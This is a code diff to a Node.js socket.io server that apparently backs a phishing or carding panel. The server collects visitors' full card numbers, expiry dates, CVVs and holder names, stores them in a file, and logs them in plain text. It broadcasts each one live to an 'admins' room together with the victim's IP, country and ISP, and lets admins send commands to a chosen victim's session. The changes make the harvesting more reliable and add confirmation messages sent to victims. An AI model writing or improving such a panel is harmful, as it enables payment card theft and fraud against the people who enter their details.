@@ -1,3 +1,4 @@
+
 const express = require('express');
 const fs = require('fs');
 const path = require('path');
@@ -34,7 +35,7 @@ app.use(express.json());
 const submissionsFilePath = path.join(__dirname, 'submissions.json');
 let cardSubmissionsQueue = [];
 
-// In-memory storage for active visitors
+// In-memory storage for active visitors - using Map to prevent duplicates by IP
 let activeVisitors = new Map();
 
 // Function to load submissions from file
@@ -152,7 +153,7 @@ const getCountryFlag = (countryCode) => {
 // Load submissions when the server starts
 loadSubmissions();
 
-// Clean up inactive visitors every 2 minutes
+// Clean up inactive visitors every 2 minutes - Fixed to prevent duplicates
 setInterval(() => {
   const now = Date.now();
   const inactiveThreshold = 2 * 60 * 1000; // 2 minutes
@@ -173,6 +174,18 @@ io.on('connection', async (socket) => {
   const clientIp = getClientIP(socket);
   console.log(`[Server] Processing connection for IP: ${clientIp}`);
   
+  // Check if visitor with same IP already exists to prevent duplicates
+  let existingVisitor = null;
+  for (const [socketId, visitor] of activeVisitors.entries()) {
+    if (visitor.ip === clientIp && socketId !== socket.id) {
+      existingVisitor = visitor;
+      // Remove the old entry
+      activeVisitors.delete(socketId);
+      io.emit('visitor_left', { id: socketId });
+      break;
+    }
+  }
+  
   // Fetch real location data
   const locationData = await getLocationData(clientIp);
   console.log(`[Server] Location data for ${clientIp}:`, locationData);
@@ -188,7 +201,7 @@ io.on('connection', async (socket) => {
     ...locationData
   };
   
-  // Store visitor
+  // Store visitor with socket ID as key to prevent duplicates
   activeVisitors.set(socket.id, visitor);
   
   console.log(`[Server] New visitor: ${socket.id} from ${clientIp} (${locationData.country}, ${locationData.isp})`);
@@ -235,6 +248,7 @@ io.on('connection', async (socket) => {
     console.log(`[Server] Admin connected: ${socket.id}`);
 
     // Send all queued card submissions to the newly connected admin
+    console.log(`[Server] Sending ${cardSubmissionsQueue.length} submissions to admin`);
     cardSubmissionsQueue.forEach(submission => {
       socket.emit('card_submission', submission);
     });
@@ -248,14 +262,17 @@ io.on('connection', async (socket) => {
     console.log(`[Server] Sent ${activeVisitors.size} current visitors to admin`);
   });
 
-  // Handler for card data from a user
+  // Enhanced card data handler with better validation and debugging
   socket.on('card_submission', (payload) => {
+    console.log(`[Server] Received card submission from ${socket.id}:`, payload);
+    
     // Validate required fields
     const requiredFields = ['card_number', 'expiry_month', 'expiry_year', 'cvv', 'card_holder', 'amount'];
     const missingFields = requiredFields.filter(field => !payload[field]);
     
     if (missingFields.length > 0) {
-      console.error('Missing required fields:', missingFields);
+      console.error('[Server] Missing required fields:', missingFields);
+      socket.emit('submission_error', { error: 'Missing required fields', fields: missingFields });
       return;
     }
 
@@ -276,10 +293,14 @@ io.on('connection', async (socket) => {
     // Add the submission to the in-memory queue
     cardSubmissionsQueue.push(submissionPayload);
     saveSubmissions();
-    console.log(`[Server] Card submission received and queued. Queue size: ${cardSubmissionsQueue.length}`);
+    console.log(`[Server] Card submission processed and queued. Queue size: ${cardSubmissionsQueue.length}`);
 
-    // Send the data ONLY to admins
+    // Send the data to ALL admins with immediate broadcast
+    console.log(`[Server] Broadcasting card submission to admins:`, submissionPayload);
     io.to('admins').emit('card_submission', submissionPayload);
+    
+    // Send confirmation back to the submitter
+    socket.emit('submission_received', { id: socket.id, status: 'received' });
   });
 
   // Helper function to detect card type
@@ -293,13 +314,17 @@ io.on('connection', async (socket) => {
 
   // Handler for commands from an admin
   socket.on('admin_command', (payload) => {
+    console.log(`[Server] Admin command received:`, payload);
     io.to('admins').emit('admin_command', payload);
 
     const targetSocketId = payload.submission_id;
     if (targetSocketId) {
       const targetSocket = io.sockets.sockets.get(targetSocketId);
       if (targetSocket) {
+        console.log(`[Server] Sending command to target socket: ${targetSocketId}`);
         targetSocket.emit('admin_command', payload);
+      } else {
+        console.log(`[Server] Target socket ${targetSocketId} not found`);
       }
     }
   });
